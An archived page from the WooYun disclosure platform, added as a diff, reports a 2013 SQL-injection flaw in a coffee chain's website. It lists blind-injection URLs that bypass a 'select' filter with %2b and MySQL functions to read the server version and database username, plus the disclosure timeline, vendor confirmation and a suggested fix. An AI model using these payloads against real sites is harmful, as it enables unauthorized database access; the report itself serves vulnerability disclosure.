@@ -1,0 +1,244 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		绕过车库咖啡SQL防注入逻辑继续注射（经典注射+表达式判断技巧）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		绕过车库咖啡SQL防注入逻辑继续注射（经典注射+表达式判断技巧）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/吴钩霜雪明">吴钩霜雪明</a> 
+</li><li>提交时间：		2013-07-05 16:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-26：	细节向普通白帽子公开<br/>
+									2013-08-05：	细节向实习白帽子公开<br/>
+									2013-08-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">虽然过滤了select 但是...</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">虽然过滤了select 但是用%2b配合mysql内置函数一样可以注入<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">正常情况下访问如下<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=240<br />
+<br />
+</p><p class="detail"><a href="../images/05115642741882947d12581c067699efc9386ea1.png" target="_blank"><img src="../images/05115642741882947d12581c067699efc9386ea1.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=235%2b(substring(@@version,1,1))<br />
+<br />
+</p><p class="detail"><a href="../images/0512034832695897077fa8bf6f05b87fa3298df0.png" target="_blank"><img src="../images/0512034832695897077fa8bf6f05b87fa3298df0.png" alt="2.png" width="600"/></a></p><p class="detail">返回页面正常,说明版本以5开头<br />
+<br />
+<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=239%2b(substring(@@version,3,1))<br />
+<br />
+</p><p class="detail"><a href="../images/051205139d9fcac7fdbd8c0dbbaf57f53b4d6619.png" target="_blank"><img src="../images/051205139d9fcac7fdbd8c0dbbaf57f53b4d6619.png" alt="3.png" width="600"/></a></p><p class="detail">返回页面正常，说明版本是5.1<br />
+<br />
+<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=234%2b(substring(@@version,5,1))<br />
+<br />
+</p><p class="detail"><a href="../images/0512071784e2dc955942aa039042578009576036.png" target="_blank"><img src="../images/0512071784e2dc955942aa039042578009576036.png" alt="4.png" width="600"/></a></p><p class="detail">返回页面正常，说明版本是5.1.6<br />
+<br />
+<br />
+<br />
+同样的方法可以测出其他系统变量，包括@@basedir等等<br />
+<br />
+系统变量测试方法演示完毕<br />
+<br />
+-------------------------华丽的分割线---------------------------<br />
+<br />
+现在开始测用户名<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=239%2bsubstring(ascii(substring(user(),1,1)),1,1)<br />
+<br />
+</p><p class="detail"><a href="../images/051442180ac674e7fe63638686cd866e2ef072ea.png" target="_blank"><img src="../images/051442180ac674e7fe63638686cd866e2ef072ea.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+于是用户名第一个字母的ascii码第一位是1<br />
+<br />
+图太多 我就略了直接写结果吧<br />
+<br />
+<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=239%2bsubstring(ascii(substring(user(),1,1)),2,1)<br />
+<br />
+用户名第一个字母的ascii码第二位是1<br />
+<br />
+<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=237%2bsubstring(ascii(substring(user(),1,1)),3,1)<br />
+<br />
+用户名第一个字母的ascii码第三位是3<br />
+<br />
+综上，113是q<br />
+<br />
+<br />
+<br />
+继续测第二个字母……<br />
+<br />
+http://www.chekucafe.com/content_cygs.php?NID=239%2bsubstring(ascii(substring(user(),2,1)),1,1)<br />
+<br />
+用户名第二个字母的ascii码第一位是1<br />
+<br />
+用户名第二个字母的ascii码第二位是0<br />
+<br />
+用户名第二个字母的ascii码第二位是9<br />
+<br />
+109是m<br />
+<br />
+其他省略……<br />
+<br />
+大概过程就是这样 <br />
+<br />
+------------------------------华丽的分割线-----------------------------<br />
+<br />
+其实就是想说它的过滤方法根本不治本<br />
+<br />
+要想利用是完全可以的 只是得根据实际情况自己用函数来构造语句 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">不要用过滤的方法了，直接类型转换或者存储过程吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/吴钩霜雪明" title="吴钩霜雪明">吴钩霜雪明</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027863" title="绕过车库咖啡SQL防注入逻辑继续注射（经典注射+表达式判断技巧）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-07-06 12:06</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">多谢! 正在修补!</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27863";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
